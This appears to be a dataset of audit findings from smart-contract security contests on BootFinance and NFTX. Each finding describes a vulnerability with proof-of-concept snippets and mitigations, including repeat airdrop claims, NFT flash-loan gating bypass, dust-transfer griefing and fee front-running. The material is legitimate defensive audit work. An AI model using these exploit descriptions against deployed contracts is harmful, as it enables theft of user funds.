However, the `SwapUtils.swap / _calculateSwap` function does not do this, it only uses the ""new A"", see `getYC` step 5.

```solidity
// 5. Check if we switched A's during the swap
if (aNew == a){     // We have used the correct A
    return y;
} else {    // We have switched A's, do it again with the new A
    return getY(self, tokenIndexFrom, tokenIndexTo, x, xp, aNew, d);
}
```

#### Impact

Trades that cross the target price and would lead to a new amplifier being used are not split up and use the new amplifier for the *entire trade*.
This can lead to a worse (better) average execution price than manually splitting the trade into two transactions, first up to but below the target price, and a second one with the rest of the trader order size, using both A1 and A2 values.

In the worst case, it could even be possible to make the entire trade with one amplifier and then sell the swap result again using the other amplifier making a profit.

#### Recommended Mitigation Steps

Trades that lead to a change in amplifier value need to be split up into two trades using both amplifiers to correctly calculate the swap result."
51.md,Claim airdrop repeatedly,high,"#### Impact

Suppose someone claims the last part of his airdrop via `claimExact()` of `AirdropDistribution.sol`
Then `airdrop\[msg.sender].amount` will be set to 0.

Suppose you then call validate() again.
The check `airdrop\[msg.sender].amount == 0` will allow you to continue, because amount has just be set to 0.
In the next part of the function, `airdrop\[msg.sender]` is overwritten with fresh values and `airdrop\[msg.sender]`.claimed will be reset to 0.

Now you can claim your airdrop again (as long as there are tokens present in the contract)

Note: The function `claim()` prevents this from happening via `assert(airdrop\[msg.sender].amount - claimable != 0);`, which has its own problems, see other reported issues.

#### Proof of Concept

// <https://github.com/code-423n4/2021-11-bootfinance/blob/7c457b2b5ba6b2c887dafdf7428fd577e405d652/vesting/contracts/AirdropDistribution.sol#L555-L563>

```solidity
function claimExact(uint256 \_value) external nonReentrant {
require(msg.sender != address(0));
require(airdrop\[msg.sender].amount != 0);`

    uint256 avail = _available_supply();
    uint256 claimable = avail * airdrop[msg.sender].fraction / 10**18; //
    if (airdrop[msg.sender].claimed != 0){
        claimable -= airdrop[msg.sender].claimed;
    }

    require(airdrop[msg.sender].amount >= claimable); // amount can be equal to claimable
    require(_value <= claimable);                       // _value can be equal to claimable
    airdrop[msg.sender].amount -= _value;      // amount will be set to 0 with the last claim
```
// <https://github.com/code-423n4/2021-11-bootfinance/blob/7c457b2b5ba6b2c887dafdf7428fd577e405d652/vesting/contracts/AirdropDistribution.sol#L504-L517>
```solidity
function validate() external nonReentrant {
...
require(airdrop\[msg.sender].amount == 0, ""Already validated."");
...
Airdrop memory newAirdrop = Airdrop(airdroppable, 0, airdroppable, 10\*\*18 \* airdroppable / airdrop_supply);
airdrop\[msg.sender] = newAirdrop;
validated\[msg.sender] = 1;   // this is set, but isn't checked on entry of this function
```

#### Recommended Mitigation Steps

Add the following to `validate() :
require(validated\[msg.sender]== 0, ""Already validated."");`"
51.md,Ideal balance is not calculated correctly when providing imbalanced liquidity,high,"#### Impact

When a user provides imbalanced liquidity, the fee is calculated according to the ideal balance. In saddle finance, the optimal balance should be the same ratio as in the Pool.

Take, for example, if there's 10000 USD and 10000 DAI in the saddle's USD/DAI pool, the user should get the optimal lp if he provides lp with ratio = 1.

However, if the `customSwap` pool is created with a target price = 2. The user would get 2 times more lp if he deposits DAI.
[SwapUtils.sol#L1227-L1245](https://github.com/code-423n4/2021-11-bootfinance/blob/main/customswap/contracts/SwapUtils.sol#L1227-L1245)
The current implementation does not calculates ideal balance correctly.

If the target price is set to be 10, the ideal balance deviates by 10.
The fee deviates a lot. I consider this is a high-risk issues.

#### Proof of Concept

We can observe the issue if we initiates two pools DAI/LINK pool and set the target price to be 4.

For the first pool, we deposit more DAI.

```python
    swap = deploy_contract('Swap' 
        [dai.address, link.address], [18, 18], 'lp', 'lp', 1, 85, 10**7, 0, 0, 4* 10**18)
    link.functions.approve(swap.address, deposit_amount).transact()
    dai.functions.approve(swap.address, deposit_amount).transact()
    previous_lp = lptoken.functions.balanceOf(user).call()
    swap.functions.addLiquidity([deposit_amount, deposit_amount // 10], 10, 10**18).transact()
    post_lp = lptoken.functions.balanceOf(user).call()
    print('get lp', post_lp - previous_lp)
```

For the second pool, one we deposit more DAI.

```python
    swap = deploy_contract('Swap' 
        [dai.address, link.address], [18, 18], 'lp', 'lp', 1, 85, 10**7, 0, 0, 4* 10**18)
    link.functions.approve(swap.address, deposit_amount).transact()
    dai.functions.approve(swap.address, deposit_amount).transact()
    previous_lp = lptoken.functions.balanceOf(user).call()
    swap.functions.addLiquidity([deposit_amount, deposit_amount // 10], 10, 10**18).transact()
    post_lp = lptoken.functions.balanceOf(user).call()
    print('get lp', post_lp - previous_lp)
```

We can get roughly 4x more lp in the first case

#### Tools Used

None

#### Recommended Mitigation Steps

The current implementation uses `self.balances`

<https://github.com/code-423n4/2021-11-bootfinance/blob/main/customswap/contracts/SwapUtils.sol#L1231-L1236>

```js
for (uint256 i = 0; i < self.pooledTokens.length; i++) {
    uint256 idealBalance = v.d1.mul(self.balances[i]).div(v.d0);
    fees[i] = feePerToken
        .mul(idealBalance.difference(newBalances[i]))
        .div(FEE_DENOMINATOR);
    self.balances[i] = newBalances[i].sub(
        fees[i].mul(self.adminFee).div(FEE_DENOMINATOR)
    );
    newBalances[i] = newBalances[i].sub(fees[i]);
}
```

Replaces `self.balances` with `_xp(self, newBalances)` would be a simple fix.
I consider the team can take balance's weighted pool as a reference. [WeightedMath.sol#L149-L179](https://github.com/balancer-labs/balancer-v2-monorepo/blob/7ff72a23bae6ce0eb5b134953cc7d5b79a19d099/pkg/pool-weighted/contracts/WeightedMath.sol#L149-L179)"
51.md,`customPrecisionMultipliers` would be rounded to zero and break the pool,high,"#### Impact

`CustomPrecisionMultipliers` are set in the constructor:

```solidity
customPrecisionMultipliers[0] = targetPriceStorage.originalPrecisionMultipliers[0].mul(_targetPrice).div(10 ** 18);
```

`originalPrecisionMultipliers` equal to 1 if the token's decimal = 18. The targe price could only be an integer.

If the target price is bigger than 10\*\*18, the user can deposit and trade in the pool. Though, the functionality would be far from the spec.

If the target price is set to be smaller than 10\*\*18, the pool would be broken and all funds would be stuck.

I consider this is a high-risk issue.

#### Proof of Concept

Please refer to the implementation.
[Swap.sol#L184-L187](https://github.com/code-423n4/2021-11-bootfinance/blob/main/customswap/contracts/Swap.sol#L184-L187)

We can also trigger the bug by setting a pool with target price = 0.5. (0.5 \* 10\*\*18)

#### Tools Used

None

#### Recommended Mitigation Steps

I recommend providing extra 10\*\*18 in both multipliers.

```solidity
customPrecisionMultipliers[0] = targetPriceStorage.originalPrecisionMultipliers[0].mul(_targetPrice).mul(10**18).div(10 ** 18);
customPrecisionMultipliers[1] = targetPriceStorage.originalPrecisionMultipliers[1].mul(10**18);
```

The customswap only supports two tokens in a pool, there's should be enough space. Recommend the devs to go through the trade-off saddle finance has paid to support multiple tokens. The code could be more clean and efficient if the pools' not support multiple tokens."
51.md,Unable to claim vesting due to unbounded timelock loop,high,"#### Impact

The timelocks for any *beneficiary* are unbounded, and can be vested by someone who is not the *beneficiary*. When the array becomes significantly big enough, the vestments will no longer be claimable for the *beneficiary*.

The `vest()` function in Vesting.sol does not check the *beneficiary*, hence anyone can vest for anyone else, pushing a new timelock to the `timelocks[_beneficiary]`.
The `_claimableAmount()` function (used by `claim()` function), then loops through the `timelocks[_beneficiary]` to determine the amount to be claimed.
A malicious actor can easy repeatedly call the `vest()` function with minute amounts to make the array large enough, such that when it comes to claiming, it will exceed the gas limit and revert, rendering the vestment for the beneficiary unclaimable.
The malicious actor could do this to each *beneficiary*, locking up all the vestments.

#### Proof of Concept

- <https://github.com/code-423n4/2021-11-bootfinance/blob/main/vesting/contracts/Vesting.sol#L81>
- <https://github.com/code-423n4/2021-11-bootfinance/blob/main/vesting/contracts/Vesting.sol#L195>
- <https://github.com/code-423n4/2021-11-bootfinance/blob/main/vesting/contracts/Vesting.sol#L148>

#### Tools Used

Manual code review

#### Recommended Mitigation Steps

*   Create a minimum on the vestment amounts, such that it won't be feasible for a malicious actor to create a large amount of vestments.
*   Restrict the vestment contribution of a *beneficiary* where `require(beneficiary == msg.sender)`"
51.md,addInvestor() Does Not Check Availability of investors_supply,high,"#### Impact

When add investor, `addInvestor()` does not check how many tokens is available from `investors_supply`. The total tokens allocated for Investors could more than `investors_supply`.

Possible Attack Scenario:

1.  Attacker who have Admin Private key call `addInvestor()` and `Input \_amount >= investors_supply`.
2.  Attacker can Claim All Available Tokens Now.

#### Proof of Concept

<https://github.com/code-423n4/2021-11-bootfinance/blob/main/vesting/contracts/InvestorDistribution.sol#L85-L94>

#### Tools Used

Manual Review

#### Recommended

1.  Add `require(\_amount <= (investors_supply - Allocated_Amount))`
2.  When Add an Investor add the amount to `Allocated_Amount` with SafeMath"
51.md,Unchecked transfers,medium,"#### Impact

Multiple calls to `transferFrom` and transfer are frequently done without checking the results. For certain ERC20 tokens, if insufficient tokens are present, no revert occurs but a result of “false” is returned. It’s important to check this. If you don’t, in this concrete case, some airdrop eligible participants could be left without their tokens. It is also a best practice to check this.

#### Proof of Concept
```
AirdropDistributionMock.sol:132:        mainToken.transfer(msg.sender, claimable_to_send);
AirdropDistributionMock.sol:157:        mainToken.transfer(msg.sender, claimable_to_send);
AirdropDistribution.sol:542:        mainToken.transfer(msg.sender, claimable_to_send);
AirdropDistribution.sol:567:        mainToken.transfer(msg.sender, claimable_to_send);

InvestorDistribution.sol:132:        mainToken.transfer(msg.sender, claimable_to_send);
InvestorDistribution.sol:156:        mainToken.transfer(msg.sender, claimable_to_send);
InvestorDistribution.sol:207:        mainToken.transfer(msg.sender, bal);

Vesting.sol:95:        vestingToken.transferFrom(msg.sender, address(this), \_amount);

PublicSale.sol:224:            mainToken.transfer(\_member, v_value);
```
#### Tools Used

Manual testing

#### Recommended Mitigation Steps

Check the result of `transferFrom` and transfer. Although if this is done, the contracts will not be compatible with non standard ERC20 tokens like USDT. For that reason, I would rather recommend making use of SafeERC20 library: `safeTransfer` and `safeTransferFrom`."
51.md,Unchecked low-level calls,medium,"#### Impact

Unchecked low-level calls

#### Proof of Concept

Unchecked cases at 2 places :-
`BasicSale.receive()` (2021-11-bootfinance/tge/contracts/PublicSale.sol#148-156) ignores return value by `burnAddress.call{value: msg.value}()` (2021-11-bootfinance/tge/contracts/PublicSale.sol#154)

BasicSale.burnEtherForMember(address) (2021-11-bootfinance/tge/contracts/PublicSale.sol#158-166) ignores return value by `burnAddress.call{value: msg.value}()` (2021-11-bootfinance/tge/contracts/PublicSale.sol#164)

#### Tools Used

Manual

#### Recommended Mitigation Steps

The return value of the low-level call is not checked, so if the call fails, the Ether will be locked in the contract. If the low level is used to prevent blocking operations, consider logging failed calls."
51.md,Investor can't claim the last tokens (via claim() ),medium,"#### Impact

Suppose you are an investor and want to claim the last part of your claimable tokens (or your entire set of claimable tokens if you haven't claimed anything yet).
Then you call the function `claim()` of `InvestorDistribution.sol`, which has the following statement:
`require(investors\[msg.sender].amount - claimable != 0);`
This statement will prevent you from claiming your tokens because it will stop execution.

Note: with the function `claimExact()` it is possible to claim the last part.

#### Proof of Concept

// <https://github.com/code-423n4/2021-11-bootfinance/blob/7c457b2b5ba6b2c887dafdf7428fd577e405d652/vesting/contracts/InvestorDistribution.sol#L113-L128>

```solidity
function claim() external nonReentrant {
...
require(investors\[msg.sender].amount - claimable != 0);
investors\[msg.sender].amount -= claimable;
```

#### Tools Used

#### Recommended Mitigation Steps

Remove the require statement."
51.md,Get virtual price is not monotonically increasing,medium,"#### Impact

There's a feature of `virtualPrice` that is monotonically increasing regardless of the market. This function is heavily used in multiple protocols. e.g.(curve metapool, mim, ...) This is not held in the current implementation of customSwap since `customPrecisionMultipliers` can be changed by changing the target price.

There are two issues here:
The meaning of `virtualPrice` would be vague.
This may damage the lp providers as the protocol that adopts it may be hacked.

I consider this is a medium-risk issue.

#### Proof of Concept

We can set up a mockSwap with extra `setPrecisionMultiplier` to check the issue.

```solidity
    function setPrecisionMultiplier(uint256 multipliers) external {
        swapStorage.tokenPrecisionMultipliers[0] = multipliers; 
    }
```

```python
    print(swap.functions.getVirtualPrice().call())
    swap.functions.setPrecisionMultiplier(2).transact()
    print(swap.functions.getVirtualPrice().call())"
51.md,Stop ramp target price would create huge arbitrage space.,medium,"### Stop ramp target price would create huge arbitrage space.

#### Impact

`stopRampTargetPrice` would set the `tokenPrecisionMultipliers` to `originalPrecisionMultipliers[0].mul(currentTargetPrice).div(WEI_UNIT);`
Once the `tokenPrecisionMultipliers` is changed, the price in the AMM pool would change. Arbitrager can sandwich `stopRampTargetPrice` to gain profit.

Assume the decision is made in the DAO, an attacker can set up the bot once the proposal to `stopRampTargetPrice` has passed. I consider this is a medium-risk issue.

#### Proof of Concept

The `precisionMultiplier` is set here:
[Swap.sol#L661-L666](https://github.com/code-423n4/2021-11-bootfinance/blob/main/customswap/contracts/Swap.sol#L661-L666)

We can set up a mockSwap with extra `setPrecisionMultiplier` to check the issue.

```solidity
function setPrecisionMultiplier(uint256 multipliers) external {
    swapStorage.tokenPrecisionMultipliers[0] = multipliers; 
}
```

```python
print(swap.functions.getVirtualPrice().call())
swap.functions.setPrecisionMultiplier(2).transact()
print(swap.functions.getVirtualPrice().call())"
51.md,`MainToken.set_mint_multisig()` doesn't check that `_minting_multisig` doesn't equal zero,medium,"The function `MainToken.set_mint_multisig()` doesn't check that `_minting_multisig` doesn't equal zero before it sets it as the new `minting_multisig`.

#### Impact

This function can be invoked by mistake with the zero address as `_minting_multisig`, causing the system to lose its `minting_multisig` forever, without the option to set a new `minting_multisig`.

#### Tool Used

Manual code review.

#### Recommended Mitigation Steps

Check that `_minting_multisig` doesn't equal zero before setting it as the new `minting_multisig`."
51.md,`LPToken.set_minter()` doesn't check that `_minter` doesn't equal zero,medium,"The function `LPToken.set_minter()` doesn't check that `_minter` doesn't equal zero before it sets it as the new minter.

#### Impact

This function can be invoked by mistake with the zero address as `_minter`, causing the system to lose its minter forever, without the option to set a new minter.

#### Tool Used

Manual code review.

#### Recommended Mitigation Steps

Check that `_minter` doesn't equal zero before setting it as the new minter."
51.md,NFT flashloans can bypass sale constraints,medium,"#### Impact

Public sale has a constraint that for the first 4 weeks only NFT holders can access the sale:

```solidity
if (currentEra < firstPublicEra) {
    require(nft.balanceOf(msg.sender) > 0, ""You need NFT to participate in the sale."");
}
```

However, this check can be easily bypassed with the help of flash loans. You can borrow the NFT, participate in the sale and then return this NFT in one transaction. It takes only 1 NFT that could be flashloaned again and again to give access to the sale for everyone (`burnEtherForMember`).

#### Recommended Mitigation Steps

I am not sure what could be the most elegant solution to this problem. You may consider transferring and locking this NFT for at least 1 block but then the user will need to do an extra tx to retrieve it back. You may consider taking a snapshot of user balances so the same NFT can be used by one address only but then this NFT will lose its extra benefit of selling it during the pre-sale when it acts as a pre-sale token. You may consider checking that the caller is EOA but again there are ways to bypass that too."
51.md,Can't claim last part of airdrop,medium,"#### Impact

Suppose you are eligible for the last part of your airdrop (or your entire airdrop if you haven't claimed anything yet).
Then you call the function claim() of AirdropDistribution.sol, which has the following statement:
`assert(airdrop\[msg.sender].amount - claimable != 0);`
This statement will prevent you from claiming your airdrop because it will stop execution.

Note: with the function `claimExact()` it is possible to claim the last part.

#### Proof of Concept

// <https://github.com/code-423n4/2021-11-bootfinance/blob/7c457b2b5ba6b2c887dafdf7428fd577e405d652/vesting/contracts/AirdropDistribution.sol#L522-L536>

```solidity
function claim() external nonReentrant {
..
assert(airdrop\[msg.sender].amount - claimable != 0);
airdrop\[msg.sender].amount -= claimable;
```

#### Recommended Mitigation Steps

Remove the assert statement.
Also add the following to `validate()` , to prevent claiming the airdrop again:
`require(validated\[msg.sender]== 0, ""Already validated."");`"
51.md,Overwrite benRevocable,medium,"#### Impact

Anyone can call the function `vest()` of `Vesting.sol`, for example with a smail `\_amount` of tokens, for any `\_beneficiary`.

The function overwrites the value of `benRevocable\[\_beneficiary]`, effectively erasing any previous value.

So you can set any `\_beneficiary` to Revocable.
Although `revoke()` is only callable by the owner, this is circumventing the entire mechanism of `benRevocable`.

#### Proof of Concept

// <https://github.com/code-423n4/2021-11-bootfinance/blob/7c457b2b5ba6b2c887dafdf7428fd577e405d652/vesting/contracts/Vesting.sol#L73-L98>

```solidity
function vest(address \_beneficiary, uint256 \_amount, uint256 \_isRevocable) external payable whenNotPaused {
    ...
if(\_isRevocable == 0){
    benRevocable\[\_beneficiary] = \[false,false];  // just overwrites the value
}
else if(\_isRevocable == 1){
    benRevocable\[\_beneficiary] = \[true,false]; // just overwrites the value
}
```


#### Recommended Mitigation Steps

Whitelist the calling of `vest()`
Or check if values for `benRevocable` are already set."
51.md,No Transfer Ownership Pattern,medium,"#### Impact

The current ownership transfer process involves the current owner calling `Swap.transferOwnership()`. This function checks the new owner is not the zero address and proceeds to write the new owner's address into the owner's state variable. If the nominated EOA account is not a valid account, it is entirely possible the owner may accidentally transfer ownership to an uncontrolled account, breaking all functions with the `onlyOwner()` modifier.

#### Proof of Concept

1.  Navigate to ""<https://github.com/code-423n4/2021-11-bootfinance/blob/7c457b2b5ba6b2c887dafdf7428fd577e405d652/customswap/contracts/Swap.sol#L30>""
2.  The contract has many `onlyOwner` function.
3.  The contract is inherited from the Ownable which includes `transferOwnership`.

#### Tools Used

None

#### Recommended Mitigation Steps

Implement zero address check and consider implementing a two step process where the owner nominates an account and the nominated account needs to call an `acceptOwnership()` function for the transfer of ownership to fully succeed. This ensures the nominated EOA account is a valid and active account."
69.md,buyAndSwap1155WETH() function may cause loss of user assets,high,"In the NFTXMarketplaceZap.sol contract, the buyAndSwap1155WETH function uses the WETH provided by the user to exchange VaultToken, but when executing the \_buyVaultToken method, msg.value is used instead of maxWethIn. Since msg.value is 0, the call will fail.
```solidity
function buyAndSwap1155WETH(
  uint256 vaultId,
  uint256[] memory idsIn,
  uint256[] memory amounts,
  uint256[] memory specificIds,
  uint256 maxWethIn,
  address[] calldata path,
  address to
) public payable nonReentrant {
  require(to != address(0));
  require(idsIn.length != 0);
  IERC20Upgradeable(address(WETH)).transferFrom(msg.sender, address(this), maxWethIn);
  uint256 count;
  for (uint256 i = 0; i <idsIn.length; i++) {
      uint256 amount = amounts[i];
      require(amount> 0, ""Transferring <1"");
      count += amount;
  }
  INFTXVault vault = INFTXVault(nftxFactory.vault(vaultId));
  uint256 redeemFees = (vault.targetSwapFee() * specificIds.length) + (
      vault.randomSwapFee() * (count-specificIds.length)
  );
  uint256[] memory swapAmounts = _buyVaultToken(address(vault), redeemFees, msg.value, path);
```

In extreme cases, when the user provides both ETH and WETH (the user approves the contract WETH in advance and calls the buyAndSwap1155WETH function instead of the buyAndSwap1155 function by mistake), the \_buyVaultToken function will execute successfully, but because the buyAndSwap1155WETH function will not convert ETH to WETH, The user’s ETH will be locked in the contract, causing loss of user assets.
```solidity
function _buyVaultToken(
  address vault,
  uint256 minTokenOut,
  uint256 maxWethIn,
  address[] calldata path
) internal returns (uint256[] memory) {
  uint256[] memory amounts = sushiRouter.swapTokensForExactTokens(
    minTokenOut,
    maxWethIn,
    path,
    address(this),
    block.timestamp
  );

  return amounts;
}
```

#### Recommended Mitigation Steps
```solidity
  - uint256[] memory swapAmounts = _buyVaultToken(address(vault), redeemFees, msg.value, path);
  + uint256[] memory swapAmounts = _buyVaultToken(address(vault), redeemFees, maxWethIn, path);
```





***"
69.md,"The return value of the _sendForReceiver function is not set, causing the receiver to receive more fees",high,"In the NFTXSimpleFeeDistributor.sol contract, the distribute function is used to distribute the fee, and the distribute function judges whether the fee is sent successfully according to the return value of the \_sendForReceiver function.

```solidity
function distribute(uint256 vaultId) external override virtual nonReentrant {
  require(nftxVaultFactory != address(0));
  address _vault = INFTXVaultFactory(nftxVaultFactory).vault(vaultId);

  uint256 tokenBalance = IERC20Upgradeable(_vault).balanceOf(address(this));

  if (distributionPaused || allocTotal == 0) {
    IERC20Upgradeable(_vault).safeTransfer(treasury, tokenBalance);
    return;
  }

  uint256 length = feeReceivers.length;
  uint256 leftover;
  for (uint256 i = 0; i <length; i++) {
    FeeReceiver memory _feeReceiver = feeReceivers[i];
    uint256 amountToSend = leftover + ((tokenBalance * _feeReceiver.allocPoint) / allocTotal);
    uint256 currentTokenBalance = IERC20Upgradeable(_vault).balanceOf(address(this));
    amountToSend = amountToSend> currentTokenBalance? currentTokenBalance: amountToSend;
    bool complete = _sendForReceiver(_feeReceiver, vaultId, _vault, amountToSend);
    if (!complete) {
      leftover = amountToSend;
    } else {
      leftover = 0;
    }
  }
```

In the \_sendForReceiver function, when \_receiver is not a contract, no value is returned. By default, this will return false. This will make the distribute function think that the fee sending has failed, and will send more fees next time.
```solidity
function _sendForReceiver(FeeReceiver memory _receiver, uint256 _vaultId, address _vault, uint256 amountToSend) internal virtual returns (bool) {
  if (_receiver.isContract) {
    IERC20Upgradeable(_vault).approve(_receiver.receiver, amountToSend);
    // If the receive is not properly processed, send it to the treasury instead.
      
    bytes memory payload = abi.encodeWithSelector(INFTXLPStaking.receiveRewards.selector, _vaultId, amountToSend);
    (bool success,) = address(_receiver.receiver).call(payload);

    // If the allowance has not been spent, it means we can pass it forward to next.
    return success && IERC20Upgradeable(_vault).allowance(address(this), _receiver.receiver) == 0;
  } else {
    IERC20Upgradeable(_vault).safeTransfer(_receiver.receiver, amountToSend);
  }
}
```
#### Proof of Concept

<https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXSimpleFeeDistributor.sol#L157-L168>

<https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXSimpleFeeDistributor.sol#L49-L67>

#### Recommended Mitigation Steps
```solidity
function _sendForReceiver(FeeReceiver memory _receiver, uint256 _vaultId, address _vault, uint256 amountToSend) internal virtual returns (bool) {
  if (_receiver.isContract) {
    IERC20Upgradeable(_vault).approve(_receiver.receiver, amountToSend);
    // If the receive is not properly processed, send it to the treasury instead.
      
    bytes memory payload = abi.encodeWithSelector(INFTXLPStaking.receiveRewards.selector, _vaultId, amountToSend);
    (bool success, ) = address(_receiver.receiver).call(payload);

    // If the allowance has not been spent, it means we can pass it forward to next.
    return success && IERC20Upgradeable(_vault).allowance(address(this), _receiver.receiver) == 0;
  } else {
    - IERC20Upgradeable(_vault).safeTransfer(_receiver.receiver, amountToSend);
    + return IERC20Upgradeable(_vault).safeTransfer(_receiver.receiver, amountToSend);
  }
}
```






***"
69.md,A vault can be locked from MarketplaceZap and StakingZap,high,"Any user that owns a vToken of a particular vault can lock the functionalities of `NFTXMarketplaceZap.sol` and `NFTXStakingZap.sol` for everyone.

Every operation performed by the marketplace, that deals with vToken minting, performs this check:

```jsx
require(balance == IERC20Upgradeable(vault).balanceOf(address(this)), ""Did not receive expected balance"");
```

A malicious user could transfer any amount > 0 of a vault’vToken to the marketplace (or staking) zap contracts, thus making the vault functionality unavailable for every user on the marketplace

#### Proof of Concept

<https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXMarketplaceZap.sol#L421>

<https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXMarketplaceZap.sol#L421>

#### Recommended Mitigation Steps

Remove this logic from the marketplace and staking zap contracts, and add it to the vaults (if necessary)







***"
69.md,Missing non reentrancy modifier,medium,"The following functions are missing reentrancy modifier although some other pulbic/external functions does use reentrancy modifer.
Even though I did not find a way to exploit it, it seems like those functions should have the nonReentrant modifier as the other functions have it as well..

```bash
  NFTXMarketplaceZap.sol, receive is missing a reentrancy modifier
  NFTXSimpleFeeDistributor.sol, __SimpleFeeDistributor__init__ is missing a reentrancy modifier
  NFTXSimpleFeeDistributor.sol, addReceiver is missing a reentrancy modifier
  NFTXSimpleFeeDistributor.sol, initializeVaultReceivers is missing a reentrancy modifier
  NFTXSimpleFeeDistributor.sol, changeReceiverAlloc is missing a reentrancy modifier
  NFTXSimpleFeeDistributor.sol, changeReceiverAddress is missing a reentrancy modifier
  NFTXSimpleFeeDistributor.sol, removeReceiver is missing a reentrancy modifier
  NFTXSimpleFeeDistributor.sol, setTreasuryAddress is missing a reentrancy modifier
  NFTXSimpleFeeDistributor.sol, setLPStakingAddress is missing a reentrancy modifier
  NFTXSimpleFeeDistributor.sol, setInventoryStakingAddress is missing a reentrancy modifier
  NFTXSimpleFeeDistributor.sol, setNFTXVaultFactory is missing a reentrancy modifier
  NFTXSimpleFeeDistributor.sol, pauseFeeDistribution is missing a reentrancy modifier
  NFTXSimpleFeeDistributor.sol, rescueTokens is missing a reentrancy modifier
  NFTXStakingZap.sol, setLPLockTime is missing a reentrancy modifier
  NFTXStakingZap.sol, setInventoryLockTime is missing a reentrancy modifier
  NFTXStakingZap.sol, provideInventory721 is missing a reentrancy modifier
  NFTXStakingZap.sol, provideInventory1155 is missing a reentrancy modifier
  NFTXStakingZap.sol, addLiquidity721ETH is missing a reentrancy modifier
  NFTXStakingZap.sol, addLiquidity1155ETH is missing a reentrancy modifier
  NFTXStakingZap.sol, addLiquidity721 is missing a reentrancy modifier
  NFTXStakingZap.sol, addLiquidity1155 is missing a reentrancy modifier
  NFTXStakingZap.sol, receive is missing a reentrancy modifier
  NFTXStakingZap.sol, rescue is missing a reentrancy modifier
  NFTXV1Buyout.sol, __NFTXV1Buyout_init is missing a reentrancy modifier
  NFTXV1Buyout.sol, emergencyWithdraw is missing a reentrancy modifier
  NFTXV1Buyout.sol, clearBuyout is missing a reentrancy modifier
  NFTXV1Buyout.sol, addBuyout is missing a reentrancy modifier
  NFTXV1Buyout.sol, removeBuyout is missing a reentrancy modifier
  NFTXVaultUpgradeable.sol, __NFTXVault_init is missing a reentrancy modifier
  NFTXVaultUpgradeable.sol, finalizeVault is missing a reentrancy modifier
  NFTXVaultUpgradeable.sol, setVaultMetadata is missing a reentrancy modifier
  NFTXVaultUpgradeable.sol, setVaultFeatures is missing a reentrancy modifier
  NFTXVaultUpgradeable.sol, assignDefaultFeatures is missing a reentrancy modifier
  NFTXVaultUpgradeable.sol, setFees is missing a reentrancy modifier
  NFTXVaultUpgradeable.sol, disableVaultFees is missing a reentrancy modifier
  NFTXVaultUpgradeable.sol, deployEligibilityStorage is missing a reentrancy modifier
  NFTXVaultUpgradeable.sol, setManager is missing a reentrancy modifier
  NFTXVaultUpgradeable.sol, mint is missing a reentrancy modifier
  NFTXVaultUpgradeable.sol, redeem is missing a reentrancy modifier
  NFTXVaultUpgradeable.sol, swap is missing a reentrancy modifier
  NFTXVaultUpgradeable.sol, flashLoan is missing a reentrancy modifier
  PalmNFTXStakingZap.sol, setLockTime is missing a reentrancy modifier
  PalmNFTXStakingZap.sol, addLiquidity721 is missing a reentrancy modifier
  PalmNFTXStakingZap.sol, addLiquidity1155 is missing a reentrancy modifier
  PalmNFTXStakingZap.sol, receive is missing a reentrancy modifier
```





***"
69.md,NFTXSimpleFeeDistributor#addReceiver: Failure to check for existing receiver,medium,"The `addReceiver()` function fails to check if the `_receiver` already exists. This could lead to the same receiver being added multiple times, which results in erroneous fee distributions.

The receiver would receive more than expected (until the duplicate entry has been removed).

#### Recommended Mitigation Steps

Have a mapping `address => bool isReceiver` that will update whenever receivers are added, modified to a new address or removed.





***"
69.md,`NFTXMarketplaceZap.sol#buyAnd***()` should return unused weth/eth back to `msg.sender` instead of `to`,medium,"<https://github.com/code-423n4/2021-12-nftx/blob/194073f750b7e2c9a886ece34b6382b4f1355f36/nftx-protocol-v2/contracts/solidity/NFTXMarketplaceZap.sol#L226-L249>

```solidity
function buyAndSwap721WETH(
  uint256 vaultId, 
  uint256[] memory idsIn, 
  uint256[] memory specificIds, 
  uint256 maxWethIn, 
  address[] calldata path,
  address to
) public nonReentrant {
  require(to != address(0));
  require(idsIn.length != 0);
  IERC20Upgradeable(address(WETH)).transferFrom(msg.sender, address(this), maxWethIn);
  INFTXVault vault = INFTXVault(nftxFactory.vault(vaultId));
  uint256 redeemFees = (vault.targetSwapFee() * specificIds.length) + (
      vault.randomSwapFee() * (idsIn.length - specificIds.length)
  );
  uint256[] memory amounts = _buyVaultToken(address(vault), redeemFees, maxWethIn, path);
  _swap721(vaultId, idsIn, specificIds, to);

  emit Swap(idsIn.length, amounts[0], to);

  // Return extras.
  uint256 remaining = WETH.balanceOf(address(this));
  WETH.transfer(to, remaining);
}
```

For example:

If Alice calls `buyAndSwap721WETH()` to buy some ERC721 and send to Bob, for slippage control, Alice put `1000 ETH` as `maxWethIn`, the actual cost should be lower.

Let's say the actual cost is `900 ETH`.

Expected Results: Alice spend only for the amount of the actual cost (`900 ETH`).

Actual Results: Alice spent `1000 ETH`.





***"
69.md,NFTXStakingZap and NFTXMarketplaceZap's transferFromERC721 transfer Cryptokitties to the wrong address,medium,"`transferFromERC721(address assetAddr, uint256 tokenId, address to)` should transfer from `msg.sender` to `to`.
It transfers to `address(this)` instead when ERC721 is Cryptokitties.
As there is no additional logic for this case it seems to be a mistake that leads to wrong NFT accounting after such a transfer as NFT will be missed in the vault (which is `to`).

#### Proof of Concept

NFTXStakingZap:
transferFromERC721
<https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXStakingZap.sol#L416>

NFTXMarketplaceZap:
transferFromERC721
<https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXMarketplaceZap.sol#L556>

Both functions are called by user facing Marketplace buy/sell and Staking addLiquidity/provideInventory functions.

#### Recommended Mitigation Steps

Fix the address:

Now:

```solidity
  // Cryptokitties.
  data = abi.encodeWithSignature(""transferFrom(address,address,uint256)"", msg.sender, address(this), tokenId);
```

To be:
```solidity
  // Cryptokitties.
  data = abi.encodeWithSignature(""transferFrom(address,address,uint256)"", msg.sender, to, tokenId);
```





***"
69.md,Pool Manager can frontrun fees to 100% and use it to steal the value from users,medium,"Pool Manager can front-run entry fee to 100% and users could lose all their deposits.

#### Proof of Concept

Considering:<br>
The pool manager is the creator of the pool.<br>
Anyone can create a pool.<br>
Manager is not a trusted actor.
